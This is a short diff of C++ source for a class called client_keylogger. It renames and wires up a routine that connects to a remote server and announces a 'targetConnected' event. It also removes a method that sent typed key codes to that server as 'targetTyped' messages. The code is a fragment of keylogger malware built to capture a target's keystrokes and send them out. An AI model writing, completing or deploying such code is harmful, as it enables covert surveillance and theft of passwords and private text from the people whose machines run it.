@@ -2,11 +2,9 @@
 #include "common.h"
 
 client_keylogger::client_keylogger(uint64_t(*scrambleFunc)(uint64_t))
-	:kq::client_interface<messageType>(scrambleFunc)
+	: kq::client_interface<messageType>(scrambleFunc)
 {
-
-
-
+	connectInnit();
 }
 
 client_keylogger::~client_keylogger()
@@ -16,20 +14,14 @@ client_keylogger::~client_keylogger()
 	Disconnect();
 }
 
-void client_keylogger::connctInnit()
+void client_keylogger::connectInnit()
 {
+	std::cout << "connectInnit()!\n";
 	if (!Connect(server_ip, server_port))
 	{
 		return;
 	}
 	kq::message<messageType> msg(messageType::targetConnected);
 
-	Send(msg);
-}
-
-void client_keylogger::sendKeyStroke(DWORD virtualKeyCode)
-{
-	kq::message<messageType> msg(messageType::targetTyped);
-	msg << virtualKeyCode;
 	Send(msg);
 }
